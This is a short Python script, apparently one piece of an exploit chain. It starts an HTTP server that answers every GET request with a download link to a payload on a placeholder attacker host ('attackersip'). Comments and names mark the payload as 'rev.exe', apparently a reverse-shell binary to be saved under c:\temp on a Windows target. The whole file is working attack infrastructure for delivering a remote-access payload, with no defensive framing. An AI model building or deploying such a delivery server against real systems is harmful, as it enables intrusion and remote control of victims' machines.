import socketserver
from http.server import HTTPServer, BaseHTTPRequestHandler

# Url for binary to execute. can be self hosted. "pyhton3 -m http.server 5555"
payload = 'http://attackersip:port/test.exe'

# exploit binary name
binaryName = 'rev.exe'

# download path
download_dir = "c:\\temp"


full_exploit = f"c:\\temp\\{binaryName}"
download = f"<a href='{payload}/download.html' id='raw-url'>Download</a>"


class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        """This just generates an HTML document that includes `message`
        in the body. Override, or re-write this do do more interesting stuff.
        """
        content = f"<html><body><h1>{message}</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html(download))

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        # Doesn't do anything with posted data
        self._set_headers()
        self.wfile.write(self._html("POST!"))


def run(server_class=HTTPServer, handler_class=S, addr="0.0.0.0", port=8000):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd server on {addr}:{port}")
    httpd.serve_forever()

run()